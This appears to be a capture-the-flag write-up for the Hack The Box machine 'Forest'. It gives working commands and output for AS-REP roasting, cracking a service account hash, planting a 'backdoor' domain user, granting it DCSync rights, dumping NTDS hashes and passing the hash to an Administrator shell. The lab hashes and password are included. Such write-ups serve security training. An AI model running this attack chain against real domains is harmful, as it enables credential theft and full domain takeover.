## ENUMERATION
<img width="682" height="399" alt="image" src="https://github.com/user-attachments/assets/3f403783-14f7-43ac-9a89-e83654329c0f" />


### NMAP

```bash
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-18 04:48:28Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h03m30s, deviation: 4h02m32s, median: -16m31s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-18T04:49:19
|_  start_date: 2025-07-18T04:45:34
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-07-17T21:49:23-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

### SMB ENUMERATION

CHECKING FOR NULL SESSION

```bash
 nxc smb 10.10.10.161 -u '' -p ''                   
SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\:
```

ENUMERATING SHARES WITH NULL SESSIONS

```bash
nxc smb 10.10.10.161 -u '' -p '' --shares 
SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\: 
SMB         10.10.10.161    445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

We can’t enumerate the shares lets try to enumerate users with —users or bruteforce rid

### USER ENUMERATION

```bash
nxc smb 10.10.10.161 -u '' -p '' --users  
SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\: 
SMB         10.10.10.161    445    FOREST           -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.10.161    445    FOREST           Administrator                 2021-08-31 00:51:58 0       Built-in account for administering the computer/domain
SMB         10.10.10.161    445    FOREST           Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.10.161    445    FOREST           krbtgt                        2019-09-18 10:53:23 0       Key Distribution Center Service Account
SMB         10.10.10.161    445    FOREST           DefaultAccount                <never>             0       A user account managed by the system.
SMB         10.10.10.161    445    FOREST           $331000-VK4ADACQNUCA          <never>             0
SMB         10.10.10.161    445    FOREST           SM_2c8eef0a09b545acb          <never>             0
SMB         10.10.10.161    445    FOREST           SM_ca8c2ed5bdab4dc9b          <never>             0
SMB         10.10.10.161    445    FOREST           SM_75a538d3025e4db9a          <never>             0
SMB         10.10.10.161    445    FOREST           SM_681f53d4942840e18          <never>             0
SMB         10.10.10.161    445    FOREST           SM_1b41c9286325456bb          <never>             0
SMB         10.10.10.161    445    FOREST           SM_9b69f1b9d2cc45549          <never>             0
SMB         10.10.10.161    445    FOREST           SM_7c96b981967141ebb          <never>             0
SMB         10.10.10.161    445    FOREST           SM_c75ee099d0a64c91b          <never>             0
SMB         10.10.10.161    445    FOREST           SM_1ffab36a2f5f479cb
....
```

Here we see we have a bunch of users we can get the users and save it in a file using 

```bash
nxc smb 10.10.10.161 -u '' -p '' --users-export users
```

## EXPLOITATION

### ASREPROASTING

Since we a have bunch of users we can try for asreproast to get krbtgt hashes if any user have pre auth enabled

```bash
nxc ldap 10.10.10.161 -u users -p '' --asreproast output.txt
LDAP        10.10.10.161    389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.10.10.161    389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:af7660f936babe004342c9c1f678b7d4$6e70d2f39d8b7a4ef68d67c1b841db8a0e9b6de0baae2e1d709209ac4acd843bab374e1af9a0e79b96171bc3ee1062d06e0a1ba448f5f1d42f95ce541b8614a12863835d8bf556a71c29112be5d5e69418408c6c5a3777667d9635f253da9740286cf88124b670a7e6600eb89938cbbeffe0d47cbdd3688a0c2d99072c4d12e455ca1563964d99fb9114d6e3734e8b9cb092de1078ad9bf13d2c2c06ba78ee308ecfdc5dea1630e58c09226eff0b9cb6e5b4bfc84a9ffcdae222b8821fbfede04a6e0801b591421ee99d95f7f1adf2208eccf5441e9a8eae597367b042561da8a347181fa871
```

Here we got a hash for the user svc-alfresco

### CRACKING HASH

```bash
hashcat hash /home/panda/Downloads/rockyou.txt  --show 
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5asrep$23$svc-alfresco@HTB.LOCAL:a47dc50fbda7628a6980e6b336723f22$711e9b4ab3f7bdb5aa2613b05fb627496557111af76f09af2c39a79abfc6f421939aa47b19e4c24d129c09988176a78bcccbca5e3ef5b96c3a9ab39aaa27e3265f73dadd5d33382e35d1c2e3679a4d4051e2ac00b00bc3e789d28d3a5e02036b5442d388d618c4e8165777cb4279d34d85599c6d16e72ff83a3fdc4f7b0eb2acb6a5e8d905830b0af32fd6d17571a2ce3e99e9fd133f411b25d2e97b50361a0324b6a5e09e4e168ccea3559c37d1ddbe05a97cee1f8e993f054347c5d7fd01ee0249c4ac9bb01973df657e01b124008e391378f3cc10bf4226d5b63be1a268658129979fc5ed:s3rvice
```

### SHELL AS SVC-ALFRESCO

```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p s3rvice 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc-alfresco> tree /f /a 
Folder PATH listing
Volume serial number is 000000C9 61F2:A88F
C:.
+---Desktop
|       user.txt
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
```

### BLOODHOUND

Collecting data for bloodhound and uploading to bloodhound.

```bash
mkdir bloodhound; cd bloodhound; bloodhound-python -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.161 -d htb.local  -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
```

After selecting starting point as svc-alfresco and ending as the domain itself, we can see we have some ACL abuse over.

<img width="1454" height="865" alt="image" src="https://github.com/user-attachments/assets/691097d5-1483-4a92-86e8-df5e7eee3ea4" />


Since we are a member of service accounts which is a member of prvileged accounts which is a member of account operators , we have genericall permissions over exchange windows permissions.

We can abuse the generic all and create and add a member in the exchange windows permissions, and then with the help of writedcal we will permit write of DcSync over the domain to our created user.

### Creating user and adding to group

```bash
PS C:\Users\svc-alfresco\Documents> net user backdoor Password@123 /add /domain
```

CHECKING ON USER backdoor

```bash
PS C:\Users\svc-alfresco\Documents> net user backdoor 
User name                    backdoor
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/19/2025 5:02:34 AM
Password expires             Never
Password changeable          7/20/2025 5:02:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.

```

We can we are a part of the exchange windows permissions

### WRITE DACL ABUSE FROM LINUX

```bash
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'backdoor' -target-dn 'DC=htb,DC=local' 'htb.local'/'backdoor':'Password@123'
[*] DACL backed up to dacledit-20250719-100238.bak
[*] DACL modified successfully!
```

Now we have right to dcsync

### ABUSING DCSYNC USING SECRETSDUMP

```bash
impacket-secretsdump backdoor@10.10.10.161
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931....
.
```

And here we have our administrator password

Now we can use pth and get our root flag

### SHELL AS ADMINISTRATOR

```bash
evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> more Desktop/root.txt
```
